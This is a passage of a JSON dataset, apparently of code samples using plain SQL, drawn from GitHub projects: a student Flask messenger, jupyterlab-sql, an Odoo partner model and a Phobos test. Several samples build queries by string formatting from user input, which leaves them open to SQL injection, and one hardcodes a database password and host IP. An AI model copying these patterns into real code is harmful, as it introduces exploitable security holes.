login='{login}';\".format(**data)\n\n\n    users = sql_execute(sql, fetch_all=False)['count']\n    return bool(users)\n\n\ndef db_setLastVisit(ID):\n    sql='''\n        UPDATE users\n        SET last_visit = NOW()\n        WHERE id='{:d}';\n    '''.format(ID)\n    sql_execute(sql, fetch_all=False)\n\n\n\"\"\" \n#   . \n   True,   status   . \n  False,  .\n\"\"\"\ndef db_blockProfile(ID, status=True):\n    sql='''\n        UPDATE users\n        SET is_blocked='{}'\n        WHERE id='{:d}';\n    '''.format(status, ID)\n    sql_execute(sql, fetch_all=False)\n\n\n\ndef db_getUserID(data):\n    sql='''\n        SELECT user_id\n        FROM authentications\n        WHERE login='{login}';\n    '''.format(**data)\n    user_id = sql_execute(sql, fetch_all=False)\n    return user_id['user_id']\n\n\n\n\n## PUBLIC METHODS\n\"\"\" \n#    . \n   True,   status   . \n  False,  .\n\"\"\"\ndef db_delProfile(ID, status=True):\n    # TODO:     \n    sql='''\n        UPDATE users \n        SET is_deleted='{}'\n        WHERE id='{:d}';\n    '''.format(status, ID)\n    return sql_execute(sql, fetch_all=True)\n\n\ndef db_FullDelProfile(ID):\n    # TODO:     \n    sql='''\n        DELETE FROM authentications\n        WHERE user_id='{:d}';\n        DELETE FROM users\n        WHERE id='{:d}';\n    '''.format(ID, ID)\n    sql_execute(sql, fetch_all=True)\n    return {'status': 1}\n\n\ndef db_getProfileInfo(ID):\n    sql='''\n        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked\n        FROM users\n        WHERE id='{:d}';\n    '''.format(ID)\n    return sql_execute(sql, fetch_all=False)\n\n\ndef db_getProfilesInfo():\n    sql='''\n        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked\n        FROM users;\n    '''\n    return sql_execute(sql, fetch_all=True)\n\n\ndef db_updateProfileInfo(ID, data):\n    rows = []\n    for key in data:\n        if not key in ('first_name', 'second_name'):\n            return {'status': 0, 'message': ' .    first_name/second_name'}\n\n        if data[key]:\n            sql='''\n                SELECT first_name, second_name\n                FROM users\n                WHERE id='{:d}'\n            '''.format(ID)\n            answer = sql_execute(sql, fetch_all=False)\n\n            if data[key] == answer[key]: #       ,   .\n                rows.append(key)\n                continue\n\n            sql = '''\n                UPDATE users\n                SET {}='{}' \n                WHERE id='{:d}';\n            '''.format(key, data[key], ID)\n            sql_execute(sql, fetch_all=False)\n\n    if not len(rows):\n        return {'status': 1}\n    elif len(rows) >= 1:\n        return {'status': 1, 'message': '  {}   '.format(rows)}\n    else:\n        return {'status': 0, 'message': '  {}   '.format(rows)}\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/8852fa7c31c8d574f9b6aa901c9674cf6d1d0c8d",
        "file_path": "/src/app.py",
        "source": "from flask import Flask\n\napp = Flask(__name__, static_url_path='')\n\n# Parse Flask configuration\nfrom config import CONFIGURATION\napp.config.from_object(CONFIGURATION)\n\n#  Auth Manager\nfrom modules.AuthManager.routes import auth_module\napp.register_blueprint(auth_module)\n\n#  Profile Manager\nfrom modules.ProfileManager.routes import profile_module\napp.register_blueprint(profile_module, url_prefix='/profile')\n\n#  Messages Manager\nfrom MessagesManager.routes import messages_module\napp.register_blueprint(messages_module, url_prefix='/chat')\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/8852fa7c31c8d574f9b6aa901c9674cf6d1d0c8d",
        "file_path": "/src/modules/ProfileManager/api/db_methods.py",
        "source": "from database import sql_execute\n\n## DEVELOP METHODS\ndef db_addProfile(data):\n    sql='''\n        INSERT INTO users (first_name, second_name, created_at, last_visit, is_blocked, is_online, is_deleted) \n        VALUES ('{first_name}', '{second_name}', NOW(), NOW(), false, true, false) RETURNING id;\n    '''.format(**data)\n    user_id = sql_execute(sql, fetch_all=True)\n    sql = \"\"\"\n        INSERT INTO authentications (user_id, login, password) \n        VALUES ('{:d}', '{login}', '{password}');\n    \"\"\".format(user_id[0]['id'], **data)\n    sql_execute(sql, fetch_all=False)\n    return {'status': 1}\n\n\ndef db_isAuthDataValid(data):\n    print(data)\n    sql='''\n        SELECT user_id\n        FROM authentications\n        WHERE login='{login}' AND password='{password}';\n    '''.format(**data)\n    answer = sql_execute(sql, fetch_all=False)\n    return answer is not None\n\n    #return bool(answer['user_id'])\n\n\ndef db_isProfileExists(data):\n    sql = \"SELECT count(login) FROM authentications \"\n\n    if type(data) == int:\n        sql += \"WHERE user_id='{:d}';\".format(data)\n    elif type(data) == dict:\n        sql += \"WHERE login='{login}';\".format(**data)\n\n\n    users = sql_execute(sql, fetch_all=False)['count']\n    return bool(users)\n\n\ndef db_setLastVisit(ID):\n    sql='''\n        UPDATE users\n        SET last_visit = NOW()\n        WHERE id='{:d}';\n    '''.format(ID)\n    sql_execute(sql, fetch_all=False)\n\n\n\"\"\" \n#   . \n   True,   status   . \n  False,  .\n\"\"\"\ndef db_blockProfile(ID, status=True):\n    sql='''\n        UPDATE users\n        SET is_blocked='{}'\n        WHERE id='{:d}';\n    '''.format(status, ID)\n    sql_execute(sql, fetch_all=False)\n\n\n\ndef db_getUserID(data):\n    sql='''\n        SELECT user_id\n        FROM authentications\n        WHERE login='{login}';\n    '''.format(**data)\n    user_id = sql_execute(sql, fetch_all=False)\n    return user_id['user_id']\n\n\n\n\n## PUBLIC METHODS\n\"\"\" \n#    . \n   True,   status   . \n  False,  .\n\"\"\"\ndef db_delProfile(ID, status=True):\n    # TODO:     \n    sql='''\n        UPDATE users \n        SET is_deleted='{}'\n        WHERE id='{:d}';\n    '''.format(status, ID)\n    return sql_execute(sql, fetch_all=True)\n\n\ndef db_FullDelProfile(ID):\n    # TODO:     \n    sql='''\n        DELETE FROM authentications\n        WHERE user_id='{:d}';\n        DELETE FROM users\n        WHERE id='{:d}';\n    '''.format(ID, ID)\n    sql_execute(sql, fetch_all=True)\n    return {'status': 1}\n\n\ndef db_getProfileInfo(ID):\n    sql='''\n        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked\n        FROM users\n        WHERE id='{:d}';\n    '''.format(ID)\n    return sql_execute(sql, fetch_all=False)\n\n\ndef db_getProfilesInfo():\n    sql='''\n        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked\n        FROM users;\n    '''\n    return sql_execute(sql, fetch_all=True)\n\n\ndef db_updateProfileInfo(ID, data):\n    rows = []\n    for key in data:\n        if not key in ('first_name', 'second_name'):\n            return {'status': 0, 'message': ' .    first_name/second_name'}\n\n        if data[key]:\n            sql='''\n                SELECT first_name, second_name\n                FROM users\n                WHERE id='{:d}'\n            '''.format(ID)\n            answer = sql_execute(sql, fetch_all=False)\n\n            if data[key] == answer[key]: #       ,   .\n                rows.append(key)\n                continue\n\n            sql = '''\n                UPDATE users\n                SET {}='{}' \n                WHERE id='{:d}';\n            '''.format(key, data[key], ID)\n            sql_execute(sql, fetch_all=False)\n\n    if not len(rows):\n        return {'status': 1}\n    elif len(rows) >= 1:\n        return {'status': 1, 'message': '  {}   '.format(rows)}\n    else:\n        return {'status': 0, 'message': '  {}   '.format(rows)}\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/8852fa7c31c8d574f9b6aa901c9674cf6d1d0c8d",
        "file_path": "/src/modules/json_schemas.py",
        "source": "login_schema = {\n    'type': 'object',\n    'properties': {\n        'login': {'type': 'string'},\n        'password': {'type': 'string'}\n    },\n    'required': ['login', 'password']\n}\n\n\nregister_schema = {\n    'type': 'object',\n    'properties': {\n        'login': {'type': 'string'},\n        'password': {'type': 'string'},\n        'first_name': {'type': 'string'},\n        'second_name': {'type': 'string'}\n    },\n    'required': ['login', 'password', 'first_name', 'second_name']\n}\n\n\nprofile_update_schema = {\n    'type': 'object',\n    'properties': {\n        'first_name': {'type': 'string'},\n        'second_name': {'type': 'string'}\n    },\n    'required': ['first_name', 'second_name']\n}\n\n\nconference_create_schema = {\n    'type': 'object',\n    'properties': {\n        'name': {'type': 'string'},\n    },\n    'required': ['name']\n}\n\nconference_send_schema = {\n    'type': 'object',\n    'properties': {\n        'name': {'type': 'string'},\n    },\n    'required': ['name']\n}",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/14f6249abee49b56b3843483856dd34e5860bb6d",
        "file_path": "/src/modules/database.py",
        "source": "import psycopg2\nfrom psycopg2.extras import RealDictCursor\n\ndef sql_execute(query, fetch_all=True):\n    conn = psycopg2.connect(dbname='messenger_1', user='messenger_1', password='messenger_1', host='90.189.168.29')\n    cursor = conn.cursor(cursor_factory=RealDictCursor)\n\n    answer = None\n    cursor.execute(query)\n    conn.commit()\n    try:\n        if fetch_all:\n            answer = cursor.fetchall()\n        else:\n            answer = cursor.fetchone()\n    except psycopg2.Error as err:\n        return {'error': err}\n    finally:\n        cursor.close()\n        conn.close()\n        return answer",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/14f6249abee49b56b3843483856dd34e5860bb6d",
        "file_path": "/src/modules/json_schemas.py",
        "source": "login_schema = {\n    'type': 'object',\n    'properties': {\n        'login': {'type': 'string'},\n        'password': {'type': 'string'}\n    },\n    'required': ['login', 'password']\n}\n\n\nregister_schema = {\n    'type': 'object',\n    'properties': {\n        'login': {'type': 'string', 'pattern': '\\w+'},\n        'password': {'type': 'string', 'pattern': '\\w+'},\n        'first_name': {'type': 'string', 'pattern': '\\w+'},\n        'second_name': {'type': 'string', 'pattern': '\\w+'}\n    },\n    'required': ['login', 'password', 'first_name', 'second_name']\n}\n\n\nprofile_update_schema = {\n    'type': 'object',\n    'properties': {\n        'first_name': {'type': 'string'},\n        'second_name': {'type': 'string'}\n    },\n    'required': ['first_name', 'second_name']\n}\n\n\nconference_create_schema = {\n    'type': 'object',\n    'properties': {\n        'name': {'type': 'string'},\n    },\n    'required': ['name']\n}\n\nconference_send_schema = {\n    'type': 'object',\n    'properties': {\n        'name': {'type': 'string'},\n    },\n    'required': ['name']\n}",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tensor-nsk-lesson/messenger_1/blob/14f6249abee49b56b3843483856dd34e5860bb6d",
        "file_path": "/src/modules/json_validator.py",
        "source": "import json\nimport jsonschema\n\ndef json_validate(data_source, schema):\n    try:\n        data = json.loads(data_source)\n        jsonschema.validate(data, schema)\n        return data\n    except (jsonschema.exceptions.ValidationError, json.decoder.JSONDecodeError) as err:\n        print(err)\n        return {'status': -1, 'message': '   JSON\\''}\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/pbugnion/jupyterlab-sql/blob/010c4aac7219f7d331b89c607c9a56ddcf16e17c",
        "file_path": "/jupyterlab_sql/executor.py",
        "source": "from sqlalchemy import create_engine\nfrom sqlalchemy.pool import StaticPool\n\nfrom .serializer import make_row_serializable\nfrom .cache import Cache\nfrom .connection_url import is_sqlite\n\n\nclass QueryResult:\n    def __init__(self, keys, rows):\n        self.has_rows = rows is not None\n        self.keys = keys\n        self.rows = rows\n\n    @classmethod\n    def from_sqlalchemy_result(cls, result):\n        if result.returns_rows:\n            keys = result.keys()\n            rows = [make_row_serializable(row) for row in result]\n            return cls(keys, rows)\n        else:\n            return cls(None, None)\n\n\nclass Executor:\n    def __init__(self):\n        self._sqlite_engine_cache = Cache()\n\n    def get_table_names(self, connection_url):\n        engine = self._get_engine(connection_url)\n        return engine.table_names()\n\n    def execute_query(self, connection_url, query):\n        engine = self._get_engine(connection_url)\n        result = self._execute_with_engine(engine, query)\n        return QueryResult.from_sqlalchemy_result(result)\n\n    def get_table_summary(self, connection_url, table_name):\n        # TODO check table_name is a valid SQL table\n        query = \"select * from {} limit 10000\".format(table_name)\n        return self.execute_query(connection_url, query)\n\n    def _get_engine(self, connection_url):\n        if is_sqlite(connection_url):\n            engine = self._sqlite_engine_cache.get_or_set(\n                connection_url,\n                lambda: self._create_sqlite_engine(connection_url),\n            )\n        else:\n            engine = create_engine(connection_url)\n        return engine\n\n    def _create_sqlite_engine(self, connection_url):\n        engine = create_engine(\n            connection_url,\n            connect_args={\"check_same_thread\": False},\n            poolclass=StaticPool,\n        )\n        return engine\n\n    def _execute_with_engine(self, engine, query):\n        connection = engine.connect()\n        result = connection.execution_options(no_parameters=True).execute(\n            query\n        )\n        return result\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CompassionCH/compassion-switzerland/blob/8d340cd7e00c60b2c5907b92ba0eebb1a9e6e530",
        "file_path": "/partner_compassion/models/partner_compassion.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    Copyright (C) 2014 Compassion CH (http://www.compassion.ch)\n#    Releasing children from poverty in Jesus' name\n#    @author: Emanuel Cino <ecino@compassion.ch>\n#\n#    The licence is in the file __manifest__.py\n#\n##############################################################################\nimport logging\nimport tempfile\nimport uuid\n\nfrom odoo import api, registry, fields, models, _\nfrom odoo.tools import mod10r\nfrom odoo.tools.config import config\nfrom odoo.addons.base_geoengine.fields import GeoPoint\nfrom odoo.addons.base_geoengine import fields as geo_fields\n\n# fields that are synced if 'use_parent_address' is checked\nADDRESS_FIELDS = [\n    'street', 'street2', 'street3', 'zip', 'city', 'state_id', 'country_id']\n\nlogger = logging.getLogger(__name__)\n\ntry:\n    import pyminizip\n    import csv\n    from smb.SMBConnection import SMBConnection\n    from smb.smb_structs import OperationFailure\nexcept ImportError:\n    logger.warning(\"Please install python dependencies.\", exc_info=True)\n\n\nclass ResPartner(models.Model):\n    \"\"\" This class upgrade the partners to match Compassion needs.\n        It also synchronize all changes with the MySQL server of GP.\n    \"\"\"\n    _inherit = 'res.partner'\n\n    def _get_receipt_types(self):\n        \"\"\" Display values for the receipt selection fields. \"\"\"\n        return [\n            ('no', _('No receipt')),\n            ('default', _('Default')),\n            ('only_email', _('Only email')),\n            ('paper', _('On paper'))]\n\n    ##########################################################################\n    #                        NEW PARTNER FIELDS                              #\n    ##########################################################################\n    lang = fields.Selection(default=False)\n    total_invoiced = fields.Monetary(groups=False)\n    street3 = fields.Char(\"Street3\", size=128)\n    invalid_mail = fields.Char(\"Invalid mail\")\n    church_unlinked = fields.Char(\n        \"Church (N/A)\",\n        help=\"Use this field if the church of the partner\"\n             \" can not correctly be determined and linked.\")\n    deathdate = fields.Date('Death date', track_visibility='onchange')\n    nbmag = fields.Integer('Number of Magazines', size=2,\n                           required=True, default=1)\n    tax_certificate = fields.Selection(\n        _get_receipt_types, required=True, default='default')\n    thankyou_letter = fields.Selection(\n        _get_receipt_types, 'Thank you letter',\n        required=True, default='default')\n    calendar = fields.Boolean(\n        help=\"Indicates if the partner wants to receive the Compassion \"\n             \"calendar.\", default=True)\n    christmas_card = fields.Boolean(\n        help=\"Indicates if the partner wants to receive the \"\n             \"christmas card.\", default=True)\n    birthday_reminder = fields.Boolean(\n        help=\"Indicates if the partner wants to receive a birthday \"\n             \"reminder of his child.\", default=True)\n    photo_delivery_preference = fields.Selection(\n        selection='_get_delivery_preference',\n        default='both',\n        required=True,\n        help='Delivery preference for Child photo')\n\n    partner_duplicate_ids = fields.Many2many(\n        'res.partner', 'res_partner_duplicates', 'partner_id',\n        'duplicate_id', readonly=True)\n\n    advocate_details_id = fields.Many2one(\n        'advocate.details', 'Advocate details', copy=False)\n    engagement_ids = fields.Many2many(\n        'advocate.engagement', related='advocate_details_id.engagement_ids'\n    )\n    other_contact_ids = fields.One2many(string='Linked Partners',\n                                        domain=['|', ('active', '=', False),\n                                                ('active', '=', True)])\n    state = fields.Selection([\n        ('pending', 'Waiting for validation'),\n        ('active', 'Active')\n    ], default='active', track_visibility='onchange')\n\n    email_copy = fields.Boolean(string='CC e-mails sent to main partner')\n    type = fields.Selection(selection_add=[\n        ('email_alias', 'Email alias')\n    ])\n\n    uuid = fields.Char(default=lambda self: self._get_uuid(), copy=False,\n                       index=True)\n\n    has_agreed_child_protection_charter = fields.Boolean(\n        help=\"Indicates if the partner has agreed to the child protection\"\n             \"charter.\", default=False)\n    date_agreed_child_protection_charter = fields.Datetime(\n        help=\"The date and time when the partner has agreed to the child\"\n             \"protection charter.\"\n    )\n    geo_point = geo_fields.GeoPoint(copy=False)\n\n    # add track on fields from module base\n    email = fields.Char(track_visibility='onchange')\n    title = fields.Many2one(track_visibility='onchange')\n    lang = fields.Selection(track_visibility='onchange')\n    # module from partner_firstname\n    firstname = fields.Char(track_visibility='onchange')\n    lastname = fields.Char(track_visibility='onchange')\n    # module mail\n    opt_out = fields.Boolean(track_visibility='onchange')\n\n    ##########################################################################\n    #                             FIELDS METHODS                             #\n    ##########################################################################\n    def _get_uuid(self):\n        return str(uuid.uuid4())\n\n    @api.multi\n    def agree_to_child_protection_charter(self):\n        return self.write({\n            'has_agreed_child_protection_charter': True,\n            'date_agreed_child_protection_charter': fields.Datetime.now()\n        })\n\n    @api.multi\n    def validate_partner(self):\n        return self.write({\n            'state': 'active'\n        })\n\n    @api.multi\n    def get_unreconciled_amount(self):\n        \"\"\"Returns the amount of unreconciled credits in Account 1050\"\"\"\n        self.ensure_one()\n        mv_line_obj = self.env['account.move.line']\n        move_line_ids = mv_line_obj.search([\n            ('partner_id', '=', self.id),\n            ('account_id.code', '=', '1050'),\n            ('credit', '>', '0'),\n            ('full_reconcile_id', '=', False)])\n        res = 0\n        for move_line in move_line_ids:\n            res += move_line.credit\n        return res\n\n    @api.multi\n    def update_number_sponsorships(self):\n        \"\"\"\n        Update the sponsorship number for the related church as well.\n        \"\"\"\n        return super(\n            ResPartner,\n            self + self.mapped('church_id')).update_number_sponsorships()\n\n    ##########################################################################\n    #                              ORM METHODS                               #\n    ##########################################################################\n    @api.model\n    def create(self, vals):\n        \"\"\"\n        Lookup for duplicate partners and notify.\n        \"\"\"\n        email = vals.get('email')\n        if email:\n            vals['email'] = email.strip()\n        duplicate = self.search(\n            ['|',\n             '&',\n             ('email', '=', vals.get('email')),\n             ('email', '!=', False),\n             '&', '&',\n             ('firstname', 'ilike', vals.get('firstname')),\n             ('lastname', 'ilike', vals.get('lastname')),\n             ('zip', '=', vals.get('zip'))\n             ])\n        duplicate_ids = [(4, itm.id) for itm in duplicate]\n        vals.update({'partner_duplicate_ids': duplicate_ids})\n        vals['ref'] = self.env['ir.sequence'].get('partner.ref')\n        # Never subscribe someone to res.partner record\n        partner = super(ResPartner, self.with_context(\n            mail_create_nosubscribe=True)).create(vals)\n        partner.compute_geopoint()\n        if partner.contact_type == 'attached' and not vals.get('active'):\n            partner.active = False\n\n        return partner\n\n    @api.multi\n    def write(self, vals):\n        email = vals.get('email')\n        if email:\n            vals['email'] = email.strip()\n        res = super(ResPartner, self).write(vals)\n        if set(('country_id', 'city', 'zip')).intersection(vals):\n            self.geo_localize()\n            self.compute_geopoint()\n        return res\n\n    @api.model\n    def name_search(self, name, args=None, operator='ilike', limit=80):\n        \"\"\"Extends to use trigram search.\"\"\"\n        if args is None:\n            args = []\n        if name:\n            # First find by reference\n            res = self.search([('ref', 'like', name)], limit=limit)\n            if not res:\n                res = self.search(\n                    ['|', ('name', '%', name), ('name', 'ilike', name)],\n                    order=u\"similarity(res_partner.name, '%s') DESC\" % name,\n                    limit=limit)\n            # Search by e-mail\n            if not res:\n                res = self.search([('email', 'ilike', name)], limit=limit)\n        else:\n            res = self.search(args, limit=limit)\n        return res.name_get()\n\n    @api.model\n    def search(self, args, offset=0, limit=None, order=None, count=False):\n        \"\"\" Order search results based on similarity if name search is used.\"\"\"\n        fuzzy_search = False\n        for arg in args:\n            if arg[0] == 'name' and arg[1] == '%':\n                fuzzy_search = arg[2]\n                break\n        if fuzzy_search:\n            order = u\"similarity(res_partner.name, '%s') DESC\" % fuzzy_search\n        return super(ResPartner, self).search(\n            args, offset, limit, order, count)\n\n    ##########################################################################\n    #                             ONCHANGE METHODS                           #\n    ##########################################################################\n    @api.onchange('lastname', 'firstname', 'zip', 'email')\n    def _onchange_partner(self):\n        if ((self.lastname and self.firstname and self.zip) or self.email)\\\n                and self.contact_type != 'attached':\n            partner_duplicates = self.search([\n                ('id', '!=', self._origin.id),\n                '|',\n                '&',\n                ('email', '=', self.email),\n                ('email', '!=', False),\n                '&', '&',\n                ('firstname', 'ilike', self.firstname),\n                ('lastname', 'ilike', self.lastname),\n                ('zip', '=', self.zip)\n            ])\n            if partner_duplicates:\n                self.partner_duplicate_ids = partner_duplicates\n                # Commit the found duplicates\n                with api.Environment.manage():\n                    with registry(self.env.cr.dbname).cursor() as new_cr:\n                        new_env = api.Environment(new_cr, self.env.uid, {})\n                        self._origin.with_env(new_env).write({\n                            'partner_duplicate_ids': [(6, 0,\n                                                       partner_duplicates.ids)]\n                        })\n                return {\n                    'warning': {\n                        'title': _(\"Possible existing partners found\"),\n                        'message': _('The partner you want to add may '\n                                     'already exist. Please use the \"'\n                                     'Check duplicates\" button to review it.')\n                    },\n                }\n\n    ##########################################################################\n    #                             PUBLIC METHODS                             #\n    ##########################################################################\n    @api.multi\n    def compute_geopoint(self):\n        \"\"\" Compute geopoints. \"\"\"\n        self.filtered(lambda p: not p.partner_latitude or not\n                      p.partner_longitude).geo_localize()\n        for partner in self.filtered(lambda p: p.partner_latitude and\n                                     p.partner_longitude):\n            geo_point = GeoPoint.from_latlon(\n                self.env.cr,\n                partner.partner_latitude,\n                partner.partner_longitude)\n            vals = {'geo_point': geo_point.wkt}\n            partner.write(vals)\n            partner.advocate_details_id.write(vals)\n        return True\n\n    @api.multi\n    def generate_bvr_reference(self, product):\n        \"\"\"\n        Generates a bvr reference for a donation to the fund given by\n        the product.\n        :param product: fund product with a fund_id\n        :return: bvr reference for the partner\n        \"\"\"\n        self.ensure_one()\n        if isinstance(product, int):\n            product = self.env['product.product'].browse(product)\n        ref = self.ref\n        bvr_reference = '0' * (9 + (7 - len(ref))) + ref\n        bvr_reference += '0' * 5\n        bvr_reference += '6'    # Fund donation\n        bvr_reference += '0' * (4 - len(str(product.fund_id))) + str(\n            product.fund_id)\n        if len(bvr_reference) == 26:\n            return mod10r(bvr_reference)\n\n    ##########################################################################\n    #                             VIEW CALLBACKS                             #\n    ##########################################################################\n    @api.multi\n    def onchange_type(self, is_company):\n        \"\"\" Put title 'Friends of Compassion for companies. \"\"\"\n        res = super(ResPartner, self).onchange_type(is_company)\n        if is_company:\n            res['value']['title'] = self.env.ref(\n                'partner_compassion.res_partner_title_friends').id\n        return res\n\n    @api.model\n    def get_lang_from_phone_number(self, phone):\n        record = self.env['phone.common'].get_record_from_phone_number(phone)\n        if record:\n            partner = self.browse(record[1])\n        return record and partner.lang\n\n    @api.multi\n    def forget_me(self):\n        # Store information in CSV, inside encrypted zip file.\n        self._secure_save_data()\n\n        super(ResPartner, self).forget_me()\n        # Delete other objects and custom CH fields\n        self.write({\n            'church_id': False,\n            'church_unlinked': False,\n            'street3': False,\n            'firstname': False,\n            'deathdate': False,\n            'geo_point': False,\n            'partner_latitude': False,\n            'partner_longitude': False\n        })\n        self.advocate_details_id.unlink()\n        self.survey_inputs.unlink()\n        self.env['mail.tracking.email'].search([\n            ('partner_id', '=', self.id)]).unlink()\n        self.env['auditlog.log'].search([\n            ('model_id.model', '=', 'res.partner'),\n            ('res_id', '=', self.id)\n        ]).unlink()\n        self.env['partner.communication.job'].search([\n            ('partner_id', '=', self.id)\n        ]).unlink()\n        self.message_ids.unlink()\n        return True\n\n    @api.multi\n    def open_duplicates(self):\n        partner_wizard = self.env['res.partner.check.double'].create({\n            'partner_id': self.id,\n        })\n        return {\n            \"type\": \"ir.actions.act_window\",\n            \"res_model\": \"res.partner.check.double\",\n            \"res_id\": partner_wizard.id,\n            \"view_type\": \"form\",\n            \"view_mode\": \"form\",\n            \"target\": \"new\",\n        }\n\n    ##########################################################################\n    #                             PRIVATE METHODS                            #\n    ##########################################################################\n    @api.model\n    def _address_fields(self):\n        \"\"\" Returns the list of address fields that are synced from the parent\n        when the `use_parent_address` flag is set. \"\"\"\n        return list(ADDRESS_FIELDS)\n\n    def _secure_save_data(self):\n        \"\"\"\n        Stores partner name and address in a CSV file on NAS,\n        inside a password-protected ZIP file.\n        :return: None\n        \"\"\"\n        smb_conn = self._get_smb_connection()\n        if smb_conn and smb_conn.connect(SmbConfig.smb_ip, SmbConfig.smb_port):\n            config_obj = self.env['ir.config_parameter']\n            share_nas = config_obj.get_param('partner_compassion.share_on_nas')\n            store_path = config_obj.get_param('partner_compassion.store_path')\n            src_zip_file = tempfile.NamedTemporaryFile()\n            attrs = smb_conn.retrieveFile(share_nas, store_path, src_zip_file)\n            file_size = attrs[1]\n            if file_size:\n                src_zip_file.flush()\n                zip_dir = tempfile.mkdtemp()\n                pyminizip.uncompress(\n                    src_zip_file.name, SmbConfig.file_pw, zip_dir, 0)\n                csv_path = zip_dir + '/partner_data.csv'\n                with open(csv_path, 'ab') as csv_file:\n                    csv_writer = csv.writer(csv_file)\n                    csv_writer.writerow([\n                        str(self.id), self.ref, self.contact_address,\n                        fields.Date.today()\n                    ])\n                dst_zip_file = tempfile.NamedTemporaryFile()\n                pyminizip.compress(\n                    csv_path, '', dst_zip_file.name, SmbConfig.file_pw, 5)\n                try:\n                    smb_conn.storeFile(share_nas, store_path, dst_zip_file)\n                except OperationFailure:\n                    logger.error(\n                        \"Couldn't store secure partner data on NAS. \"\n                        \"Please do it manually by replicating the following \"\n                        \"file: \" + dst_zip_file.name)\n\n    def _get_smb_connection(self):\n        \"\"\"\" Retrieve configuration SMB \"\"\"\n        if not (SmbConfig.smb_user and SmbConfig.smb_pass and\n                SmbConfig.smb_ip and SmbConfig.smb_port):\n            return False\n        else:\n            return SMBConnection(\n                SmbConfig.smb_user, SmbConfig.smb_pass, 'odoo', 'nas')\n\n    def _get_active_sponsorships_domain(self):\n        \"\"\"\n        Include sponsorships of church members\n        :return: search domain for recurring.contract\n        \"\"\"\n        domain = super(ResPartner, self)._get_active_sponsorships_domain()\n        domain.insert(0, '|')\n        domain.insert(3, ('partner_id', 'in', self.mapped('member_ids').ids))\n        domain.insert(4, '|')\n        domain.insert(6, ('correspondent_id', 'in', self.mapped(\n            'member_ids').ids))\n        return domain\n\n    @api.model\n    def _notify_prepare_email_values(self, message):\n        \"\"\"\n        Always put reply_to value in mail notifications.\n        :param message: the message record\n        :return: mail values\n        \"\"\"\n        mail_values = super(ResPartner,\n                            self)._notify_prepare_email_values(message)\n\n        # Find reply-to in mail template.\n        base_template = None\n        if message.model and self._context.get('custom_layout', False):\n            base_template = self.env.ref(self._context['custom_layout'],\n                                         raise_if_not_found=False)\n        if not base_template:\n            base_template = self.env.ref(\n                'mail.mail_template_data_notification_email_default')\n\n        if base_template.reply_to:\n            mail_values['reply_to'] = base_template.reply_to\n\n        return mail_values\n\n\nclass SmbConfig():\n    \"\"\"\" Little class who contains SMB configuration \"\"\"\n    smb_user = config.get('smb_user')\n    smb_pass = config.get('smb_pwd')\n    smb_ip = config.get('smb_ip')\n    smb_port = int(config.get('smb_port', 0))\n    file_pw = config.get('partner_data_password')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cea-hpc/phobos/blob/b687e6b50f56c9e25208b318138c70baa4145a12",
        "file_path": "/src/cli/tests/PhobosDSSTest.py",
        "source": "#!/usr/bin/python\n\n#\n#  All rights reserved (c) 2014-2017 CEA/DAM.\n#\n#  This file is part of Phobos.\n#\n#  Phobos is free software: you can redistribute it and/or modify it under\n#  the terms of the GNU Lesser General Public License as published by\n#  the Free Software Foundation, either version 2.1 of the License, or\n#  (at your option) any later version.\n#\n#  Phobos is distributed in the hope that it will be useful,\n#  but WITHOUT ANY WARRANTY; without even the implied warranty of\n#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#  GNU Lesser General Public License for more details.\n#\n#  You should have received a copy of the GNU Lesser General Public License\n#  along with Phobos. If not, see <http://www.gnu.org/licenses/>.\n#\n\n\"\"\"Unit tests for phobos.dss\"\"\"\n\nimport sys\nimport unittest\nimport os\n\nfrom random import randint\n\nfrom phobos.core.dss import Client\nfrom phobos.core.ffi import MediaInfo, DevInfo\nfrom phobos.core.const import dev_family2str, PHO_DEV_DIR\n\n\nclass DSSClientTest(unittest.TestCase):\n    \"\"\"\n    This test case issue requests to the DSS to stress the python bindings.\n    \"\"\"\n\n    def test_client_connect(self):\n        \"\"\"Connect to backend with valid parameters.\"\"\"\n        cli = Client()\n        cli.connect()\n        cli.disconnect()\n\n    def test_client_connect_refused(self):\n        \"\"\"Connect to backend with invalid parameters.\"\"\"\n        cli = Client()\n        environ_save = os.environ['PHOBOS_DSS_connect_string']\n        os.environ['PHOBOS_DSS_connect_string'] = \\\n                \"dbname='tata', user='titi', password='toto'\"\n        self.assertRaises(EnvironmentError, cli.connect)\n        os.environ['PHOBOS_DSS_connect_string'] = environ_save\n\n    def test_list_devices_by_family(self):\n        \"\"\"List devices family by family.\"\"\"\n        with Client() as client:\n            for fam in ('tape', 'disk', 'dir'):\n                for dev in client.devices.get(family=fam):\n                    self.assertEqual(dev_family2str(dev.family), fam)\n\n    def test_list_media(self):\n        \"\"\"List media.\"\"\"\n        with Client() as client:\n            for mda in client.media.get():\n                # replace with assertIsInstance when we drop pre-2.7 support\n                self.assertTrue(isinstance(mda, MediaInfo))\n\n    def test_getset(self):\n        \"\"\"GET / SET an object to validate the whole chain.\"\"\"\n        with Client() as client:\n            insert_list = []\n            for i in range(10):\n                dev = DevInfo()\n                dev.family = PHO_DEV_DIR\n                dev.model = ''\n                dev.path = '/tmp/test_%d' % randint(0, 1000000)\n                dev.host = 'localhost'\n                dev.serial = '__TEST_MAGIC_%d' % randint(0, 